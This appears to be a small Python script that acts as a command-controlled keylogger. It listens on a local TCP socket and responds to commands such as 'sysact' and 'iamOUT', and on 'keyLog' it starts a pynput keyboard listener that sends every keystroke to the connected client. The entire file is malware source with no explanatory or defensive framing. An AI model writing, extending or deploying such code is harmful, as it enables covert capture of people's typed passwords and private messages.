import socket
import threading
import os
from pynput.keyboard import Key, Controller
from pynput.keyboard import Listener

obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
obj.bind(('127.0.0.1', 8080))

def client(cli,add):
    while True:
        cmd = cli.recv(1025)
        cmd.decode('utf-8')
        cmd1=str(cmd)
        query = cmd1
        if 'iamOUT' in query:
            break
        elif 'sysact' in query:
            act = '!!!!!!ACTIVE!!!!!!'
            cli.send(bytes(act, 'utf-8'))
        elif 'keyLog' in query:
            def on_press(key):
                k=(str(key))
                cli.send(bytes(k, 'utf-8'))
            with Listener(on_press=on_press) as listener:
                listener.join()
       
            
            
            
while True:
    obj.listen(1)
    cli, add=obj.accept()
    threading._start_new_thread(client,(cli, add))
    cmd = cli.recv(1025)
    cmd.decode('utf-8')
    cmd1=str(cmd)
    query = cmd1
    if 'iamOUT' in query:
        break
